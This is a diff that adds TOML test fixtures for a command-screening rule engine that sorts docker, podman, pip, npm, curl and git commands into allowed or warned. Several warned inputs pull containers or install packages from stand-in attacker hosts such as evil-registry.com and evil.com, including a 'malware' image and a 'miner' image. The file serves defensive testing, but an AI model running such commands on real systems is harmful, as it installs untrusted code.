@@ -1,0 +1,201 @@
+# Ecosystem rule fixtures
+
+[[fixture]]
+name = "docker_untrusted_registry"
+min_milestone = 1
+input = "docker pull evil-registry.com/malware"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["docker_untrusted_registry"]
+
+[[fixture]]
+name = "docker_trusted_dockerio"
+min_milestone = 1
+input = "docker pull nginx"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "docker_trusted_ghcr"
+min_milestone = 1
+input = "docker pull ghcr.io/user/image"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "docker_trusted_gcr"
+min_milestone = 1
+input = "docker pull gcr.io/project/image"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "docker_trusted_quay"
+min_milestone = 1
+input = "docker pull quay.io/org/image"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "docker_localhost_registry"
+min_milestone = 1
+input = "docker pull localhost:5000/test"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["docker_untrusted_registry"]
+
+[[fixture]]
+name = "docker_custom_registry_with_port"
+min_milestone = 1
+input = "docker pull myregistry.internal:5000/app"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["docker_untrusted_registry"]
+
+[[fixture]]
+name = "pip_non_pypi"
+min_milestone = 1
+input = "pip install --index-url https://evil.com/simple/ evilpkg"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["pip_url_install"]
+
+[[fixture]]
+name = "pip_pypi_ok"
+min_milestone = 1
+input = "pip install https://files.pythonhosted.org/packages/package.tar.gz"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "pip_non_pypi_index"
+min_milestone = 1
+input = "pip install --index-url https://evil.com/simple/ package"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["pip_url_install"]
+
+[[fixture]]
+name = "npm_non_registry"
+min_milestone = 1
+input = "npm install https://evil.com/package.tgz"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["npm_url_install"]
+
+[[fixture]]
+name = "npm_registry_ok"
+min_milestone = 1
+input = "npm install https://registry.npmjs.org/package/-/package-1.0.0.tgz"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "web3_rpc_infura"
+min_milestone = 1
+input = "curl https://mainnet.infura.io/v1/YOUR_KEY"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["web3_rpc_endpoint"]
+
+[[fixture]]
+name = "web3_rpc_alchemy"
+min_milestone = 1
+input = "curl https://eth-mainnet.alchemy.com/v1/key"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["web3_rpc_endpoint"]
+
+[[fixture]]
+name = "docker_run_untrusted"
+min_milestone = 1
+input = "docker run evil-registry.com/miner"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["docker_untrusted_registry"]
+
+[[fixture]]
+name = "docker_build_untrusted"
+min_milestone = 1
+input = "docker build -t evil-registry.com/image ."
+context = "exec"
+expected_action = "warn"
+expected_rules = ["docker_untrusted_registry"]
+
+[[fixture]]
+name = "podman_pull_untrusted"
+min_milestone = 1
+input = "podman pull evil-registry.com/image"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["docker_untrusted_registry"]
+
+[[fixture]]
+name = "docker_pull_with_tag"
+min_milestone = 1
+input = "docker pull evil-registry.com/image:latest"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["docker_untrusted_registry"]
+
+[[fixture]]
+name = "docker_pull_with_digest"
+min_milestone = 1
+input = "docker pull evil-registry.com/image@sha256:abc123"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["docker_untrusted_registry"]
+
+[[fixture]]
+name = "docker_trusted_ecr"
+min_milestone = 1
+input = "docker pull public.ecr.aws/image"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "docker_trusted_mcr"
+min_milestone = 1
+input = "docker pull mcr.microsoft.com/dotnet/runtime"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "docker_trusted_k8s"
+min_milestone = 1
+input = "docker pull registry.k8s.io/kube-proxy"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "pip_whl_non_pypi"
+min_milestone = 1
+input = "pip install --extra-index-url https://evil.com/simple/ evilpkg"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["pip_url_install"]
+
+[[fixture]]
+name = "normal_git_clone"
+min_milestone = 1
+input = "git clone https://github.com/user/repo.git"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "normal_npm_install"
+min_milestone = 1
+input = "npm install express"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
